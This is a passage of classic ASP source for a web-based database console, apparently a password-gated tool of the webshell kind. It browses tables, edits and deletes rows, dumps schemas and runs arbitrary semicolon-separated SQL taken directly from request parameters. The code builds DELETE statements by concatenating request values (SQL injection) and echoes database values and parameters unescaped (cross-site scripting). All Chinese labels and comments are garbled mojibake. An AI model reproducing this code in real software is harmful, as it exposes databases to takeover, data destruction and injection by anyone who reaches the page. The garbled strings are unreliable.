				echo IIf(tab.Name = keys, " disabled title='����Լ��,���޷����޸�.'", " ") & " value='"
				if action <> "add" then echo trim(tab.value)
				echo "'>"
			end if
			echo "<br>"
		Next
		
	else
		echo "<script>alert('�Ѿ�û����!');history.back();</script>"
		Response.End()
	end if
	echo "<br>"
	echo iif(action="add","","<input type=submit value=���� onclick=this.form.action.value='save';>&nbsp;")
	echo "<input type=button value=��� onclick=if(confirm('ȷʵҪ��ӵ�ǰΪ�¼�¼��?')){this.form.action.value='new';this.form.submit();};>&nbsp;"
	echo "<input type=button value=��һ�� onclick=""this.form.action.value='pre';this.form.submit();"">&nbsp;"
	echo "<input type=button value=��һ�� onclick=""this.form.action.value='next';this.form.submit();"">&nbsp;&nbsp;"
	echo "<a href='?key=view&table_name=" & names & "'>��ṹ</a>&nbsp;&nbsp;"
	echo "<a href='?key=sql&sql=select * from " & names & "&table_name="& names & "&primarykey="&keys&"'>�����</a>&nbsp;&nbsp;"
	echo "<a href='?'>������</a>&nbsp;&nbsp;"
	echo "</form></td></tr></table>"
end sub

'==================================================================��ʾ�洢����
sub showproc()
	dim sTableName,adox
	on error resume next
	echo "�洢���̣�<font color=red>" & Request("table_name") & "<font><br>"
	sTableName = Request("table_name")
	Set adox = Server.CreateObject("ADOX.Catalog")
	adox.ActiveConnection = Conn
	echo "<textarea cols=70 rows=8>" & adox.Procedures(sTableName).Command.CommandText & "</textarea><br>"
	if err <> 0 then
		echo err.description
		exit sub
	end if
end sub


'==================================================================��ҳ����
'��ҳ����
sub showNavBar (rs,page,pageUrl,pageSize)
	page = cint(page)
	%>
	<table width="100%" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
	<tr>
	  <% if request("primarykey") <> "" and request("table_name") <> "" then %>
	  <td align="left">��ǰ��<font color=red><%=request("table_name")%></font>&nbsp;&nbsp;&nbsp;&nbsp;
	  <a href="?key=edit&table_name=<%=request("table_name")%>&primarykey=<%=request("primarykey")%>&action=add">�����¼�¼</a> 
	  </td>
	  <% end if %>
	  <td align="right">
		<%
		echo "����" & rs.recordCount & "����¼ ��ǰ" & page & "/" & rs.PageCount & "ҳ"
	    if page > 1 then
			echo "<a href='" & pageUrl & "&page=1&pageSize="&pageSize&"'>��ҳ</a> " 
			echo "<a href='" & pageUrl & "&page=" & page - 1 & "&pageSize="&pageSize&"'>��ҳ</a> "
	    end if
		if (rs.PageCount > 1 and page < rs.PageCount) then
			echo "<a href='" & pageUrl & "&page=" & page + 1 & "&pageSize="&pageSize&"'>��ҳ</a> "
			echo "<a href='" & pageUrl & "&page=" & rs.pageCount & "&pageSize="&pageSize&"'>ĩҳ</a> "
		end if
		echo "ת��:��"
		echo "<select name='select2' onChange='location.href=this.value;'>"
		dim i
		for i = 1 to rs.PageCount
			echo "<option value='"& pageUrl &"&pageSize="&pageSize&"&page="& i & "' "
			if i = cint(page) then echo "selected"
			echo ">"& i &"</option>"
		next
		echo "</select>ҳ"
	    %>
		</td>
	</tr>
	</table>
	<%
end sub


'==================================================================��ʾ��ѯ
sub showselect(sql)
	dim page,pageUrl,strdel,geturl					
	pageSize = request("pageSize") 			'����ÿҳ��ʾ�ļ�¼��
	if pageSize = "" or not isNumeric(pageSize) then pageSize = 50
	
	'�ж��Ƿ�ɾ��
	if request("keylog") <> "" then
		strdel = "delete from " & request("table_name") & " where " & request("primarykey") & "=" & request("keylog")
		response.Write strdel
		conn.execute(strdel)
		geturl = "?" & replace(request.QueryString,"&keylog="&request("keylog"),"")
		response.Redirect geturl
	end if
	
	page = request("page")           '���õ�ǰ��ʾ��ҳ��
	if page="" or not isNumeric(page) then page=1
	pageUrl = "?key=sql&sql=" & sql
	if request("primarykey") <> "" and request("table_name") <> "" then
	  pageUrl = pageUrl & "&table_name=" & request("table_name") & "&primarykey=" & request("primarykey")
	end if
	
	'--------------------------
   dim rs
   set rs = Server.CreateObject("ADODB.Recordset")
   rs.Open sql,conn,3
   
   if not rs.eof then
   	  rs.pageSize = pageSize
	  if cint(page) < 1 then page = 1
   	  if cint(page) > rs.PageCount then page = rs.PageCount
   	  rs.absolutePage = page
   end if
	
	'��ʾ��ҳ����
   showNavBar rs,page,pageUrl,pageSize
   
   '-------------------------------
   echo "<div style='overflow-x:auto;overflow-y:auto; width:800;height:380;'>"
   echo "<table border=0 border=0 cellpadding=3 cellspacing=1 bgcolor=#CCCCCC><tr>"
   primarykey = request("primarykey")
   if primarykey <> "" and request("table_name") <> "" then
   echo "<td bgcolor=#ffffff>����</td><td bgcolor=#ffffff>ɾ</td>"
   end if
   for i = 0 to rs.fields.count - 1         'ѭ���ֶ���
      set field = rs.fields.item(i)
      echo "<td bgcolor=#ffffff>" & field.name & " </td>"
   next
   echo "</tr>"
   
   dim i,field,j
   do while not rs.eof and j < rs.pageSize                    'ѭ������
      echo "<tr>"
	  
	  if primarykey <> "" and request("table_name") <> "" then
	  echo "<td bgcolor=#ffffff nowrap><a href='?key=edit&table_name=" & request("table_name") & "&primarykey=" & primarykey & "&primarykeyvalue=" & rs(primarykey) & "'><font color=#666666>�༭</font></a></td>"
	  echo "<td><a href='?"&Request.QueryString&"&keylog="&rs(primarykey)&"' onClick='return table_delete();'><font color=#FF000>��</font></a></td>"
	  end if
	  
      for i = 0 to rs.fields.count - 1
         set field = rs.fields.item(i)
		 if len(field.value) < 12 then
         	echo "<td bgcolor=#ffffff nowrap>" & field.value & " </td>"
		 else
		 	echo "<td bgcolor='#ffffff'><span class='fixspan'>" & field.value & " </span></td>"
		 end if
      next
      echo "</tr>"
      rs.MoveNext
      j = j + 1
   loop
   'response.ContentType ="application/vnd.ms-excel"'����EXCEL���
   echo "</table></div>"
   
end sub


sub exesql(sql)
	on error resume next
	'==================================================================ִ��sql����
	
    if trim(request.form("SchemaTable")) <> "" then Call showSchema (adSchemaTables)
    if trim (request.form("SchemaColumn")) <> "" then Call showSchema(adSchemaColumns)
    if trim (request.form("SchemaProvider")) <> "" then Call showSchema(adSchemaProviderTypes)

	sql = trim(request("sql"))
	if sql = "" then exit sub
	
    sql = RegExpReplace(sql, "(--)(.)*\n", "")   '�滻ע��
    sql = RegExpReplace(sql, "\n[\s| ]*\r", "")  '�滻����
    sql = RegExpReplace(sql, "\n", "")           '�滻���з�
    sql = RegExpReplace(sql, "\r", "")           '�滻�س���
    if (LCase(left(sql,len("select"))) = "select") and instr(sql,"into") = 0 then
       Call showSelect (sql)
	   if err <> 0 then echo "<br><font color=red>" & err.description & "</font>"
       response.end
    else
   		'�����select���,����ִ�ж����Էֺŷָ������
   		dim aSql,iLoop
   		aSql = split(sql,";")
   		for iLoop = 0 to UBound(aSql)
			if trim(aSql(iLoop)) <> "" then
      	    	conn.execute (aSql(iLoop))
				if err <> 0 then
					echo "<br><font color=red>" & err.description & "<br>&nbsp;&nbsp;<b>"
					echo iLoop + 1 & "��</b></font><font color=#CC6600>" & aSql(iLoop) & "</font><br>"
					'err.clear()     '���Դ���
					exit sub          '��ִֹ��
				else
					echo "<div style='padding:3px 0px;border-bottom:1px solid #069;'><b>" & iLoop + 1 & "��</b>" & aSql(iLoop) & "</div>"
				end if
			end if
        next
        echo "<font color=red><h4>����ִ�гɹ�</h4></font>"
   end if
end sub

'��ʾ���ݿ���Ϣ
'QueryType������������Ҫ����
'adSchemaTables
'adSchemaColumns
'adSchemaProviderTypes
'Call showSchema (adSchemaTables)
sub showSchema(QueryType)
dim rs
'set rs = conn.OpenSchema()
set rs = conn.OpenSchema (QueryType)
'set rs = conn.OpenSchema (adSchemaProviderTypes)

   echo "<div style='overflow-x:auto;overflow-y:auto; width:800;height:380;'><table border=0 border=0 cellpadding=3 cellspacing=1 bgcolor=#CCCCCC><tr>"
   for i = 0 to rs.fields.count - 1         'ѭ���ֶ���
      set field = rs.fields.item(i)
      echo "<td bgcolor='#FFFFFF'>" & field.name & " </td>"
   next
   echo "</tr>"
   
   dim i,field
   do while not rs.eof                      'ѭ������
      echo "<tr>"
      for i = 0 to rs.fields.count - 1
         set field = rs.fields.item(i)
         echo "<td bgcolor='#FFFFFF'>" & field.value & " &nbsp;</td>"
      next
      echo "</tr>"
      rs.MoveNext
   loop
   
   echo "</table></div>"
end sub   

%>



<%
'==================================================================����SQL
sub tosql(strt)
	'strt = 0 �����ṹ
	'strt = 1 ��������
	dim strsql
	if strt = "0"  then
		table = request("table_name")
		echo "�����Ǳ� <font color=red>" & request("table_name") & "</font> �Ľṹ: "
		echo "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
		strsql = getsql(table)
	end if
	if strt = "2" then
		echo "������ <font color=red> ���ݿ� </font> �Ľṹ: "
		echo "<input type='button' name='ok' value=' �� �� ' onClick='javascript:history.go(-1)'>"
		set objSchema = Conn.OpenSchema(adSchemaTables)
		Do While Not objSchema.EOF
			if objSchema("TABLE_TYPE") = "TABLE" then
				table = objSchema("TABLE_NAME")
				strsql = strsql & getsql(table)'table & "|"'getsql(table)
			end if
		objSchema.MoveNext
		Loop
		objSchema.close
	end if		
	echo "<textarea cols=110 rows=38>" & strsql & "</textarea>"
	conn.close
end sub

'================================================================== �����ṹ
function getsql(table)
	on error resume next
	getsql = "-- ��ṹ " & table & " ��SQL��䡣" & chr(10)
	dim primary,primarykey
	Set primary = Conn.OpenSchema(adSchemaPrimaryKeys,Array(empty,empty,table))
	if primary("COLUMN_NAME") <> "" then
		primarykey = primary("COLUMN_NAME")
	end if
	
	primary.Close
	set primary = nothing
	
	tbl_struct = "CREATE TABLE [" & table & "] ( " & chr(10)
	sql = "SELECT * FROM " & table
	Set rs = Conn.Execute(sql)
	if err = 0 then
		for i = 0 to rs.fields.count-1
		   tbl_struct = tbl_struct & "[" & rs(i).name & "] "
		   typs = typ(rs(i).type)
		   if typs = "VARCHAR" or typs = "BINARY" or typs = "CHAR" then
			 tbl_struct = tbl_struct & typs & "(" & rs(i).definedsize & ")"
		   else
			 tbl_struct = tbl_struct & typs & " "
		   end if
		   attrib = rs(i).attributes
		   if (attrib and adFldIsNullable) = 0 then
			 tbl_struct = tbl_struct&" NOT NULL"
		   end if
		   if rs(i).Properties("ISAUTOINCREMENT") = True then
			 tbl_struct = tbl_struct & " IDENTITY"
		   end if
		   tbl_struct = tbl_struct & "," & chr(10)
		next
		if primarykey <> "" then
			tbl_struct = tbl_struct & "PRIMARY KEY ([" & primarykey & "]));"
		else
			len_of_sql = Len(tbl_struct)
			tbl_struct = Mid(tbl_struct,1,len_of_sql-2)
			tbl_struct = tbl_struct & ");"
		end if
	else
		tbl_struct = "CREATE TABLE [" & table & "];"
	end if
	getsql = getsql & tbl_struct & chr(10) & chr(10)
end function

sub help()
	echo "SQL ������䣺<br><br>"
	echo "������<br>"
	echo "CREATE TABLE [����] (<br>"
	echo "[test1] int not null identity,<br>"
	echo "[test2] binary not null,<br>"
	echo "primary key ([test1]))<br><br>"
	echo "����������ALTER TABLE [tablename] ADD PRIMARY KEY ([fieldname])<br><br>"
	echo "��ѯ��select * from tablename where fieldname *** order by id desc<br><br>"
	echo "���£�update tanlename set fieldname = values,cn_name='values' where ID = 1<br><br>"
	echo "��ӣ�insert into tanlename (fieldnam,fieldnam2)values (1,'values')<br><br>"
	echo "ɾ����delete from tanlename where fieldname = values<br><br>"
	echo "ɾ����DROP TABLE ���ݱ�����<br><br>"
	echo "����ֶΣ�ALTER TABLE [����] ADD [�ֶ���] NVARCHAR (50) NULL<br><br>"
	echo "ɾ���ֶΣ�alter table [tablename] drop [fieldname]<br><br>"
	echo "�޸��ֶΣ�ALTER TABLE [����] ALTER COLUMN [�ֶ���] ����(��С) NULL<br><br>"
	echo "�½�Լ����ALTER TABLE [����] ADD CONSTRAINT Լ���� CHECK ([Լ���ֶ�] <= '2000-1-1')<br><br>"
	echo "ɾ��Լ����ALTER TABLE [����] DROP CONSTRAINT Լ����<br><br>"
	echo "�½�Ĭ��ֵ��ALTER TABLE [����] ADD CONSTRAINT Ĭ��ֵ�� DEFAULT '51WINDOWS.NET' FOR [�ֶ���]<br><br>"
	echo "ɾ��Ĭ��ֵ��ALTER TABLE [����] DROP CONSTRAINT Ĭ��ֵ��<br><br>"

end sub
%>


<!--������������ʼ-->
<table width="100%" height="100%" border="0" cellpadding="5" cellspacing="1" bgcolor="#CCCCCC">
  <tr>
    <td width="18%" valign="top">

<div id="Layer1" style="overflow-x:auto;overflow-y:auto; width:100%;height:100%;">
<div style="width:140px;height:0px;overflow:hidden;"></div>
��&nbsp;<a href="?">������</a>&nbsp;<a href="?key=exit">�˳�</a>&nbsp;<a href="?key=help">Help</a><br>

<%
set objSchema = Conn.OpenSchema(adSchemaTables)
Do While Not objSchema.EOF
	if objSchema("TABLE_TYPE") = "TABLE" then
	    '�������
        echo "<a href='?key=view&table_name="& objSchema("TABLE_NAME") &"'>" & objSchema("TABLE_NAME") & "</a><br>"
	end if
objSchema.MoveNext
Loop

echo "������ͼ��<br>"
objSchema.MoveFirst
Do While Not objSchema.EOF
	if objSchema("TABLE_TYPE") = "VIEW" then
	    '�������
        echo "<a href='?key=sql&sql=SELECT * FROM [" & objSchema("TABLE_NAME")& "]'>" & objSchema("TABLE_NAME") & "</a><br>"
	end if
objSchema.MoveNext
Loop
objSchema.Close
set objSchema = nothing

'echo "�洢���̣�<br>"
'set objSchema = Conn.OpenSchema(adSchemaProcedures)
'Do While Not objSchema.EOF
'    echo "<a href='?key=proc&table_name="& objSchema("PROCEDURE_NAME") &"'>" & objSchema("PROCEDURE_NAME") & "</a><br>"
'objSchema.MoveNext
'Loop
'objSchema.Close
'set objSchema = nothing

%>
</div>
	</td>
    <td width="82%" valign="top">
<div id="Layer2" style="overflow-x:anto;overflow-y:auto; width:100%;height:100%;">
<%
select case request("key")
case "" '��ʾ������
  call main("")
case "addtable" '��ʾ���������
  call add_table(request("table_name"),request("field_num"))
case "createtable" 'ִ�д�����
  call create_table()
case "view"
  call view(request("table_name"))
case "sql"
  call main("1")
  call exesql(trim(request("sql")))
case "addfield"
  call addfield()
case "editfidlevi"
  call view(request("table_name"))
case "editfidle"
  call editfidle()
case "exit"
  session("dbtype") = ""
  session("dbstr") = ""
  session("db007pass") = ""
  response.redirect "?"
case "tosql"
  call tosql(request("strt"))
case "proc"
  call main("1")
  call showproc()
case "help"
  call help()
case "edit"
  call EditData()
case "reobj"
  call reobj()
end select
%>
</div>
	</td>
  </tr>
</table>
<!--���������������-->
</body>
</html>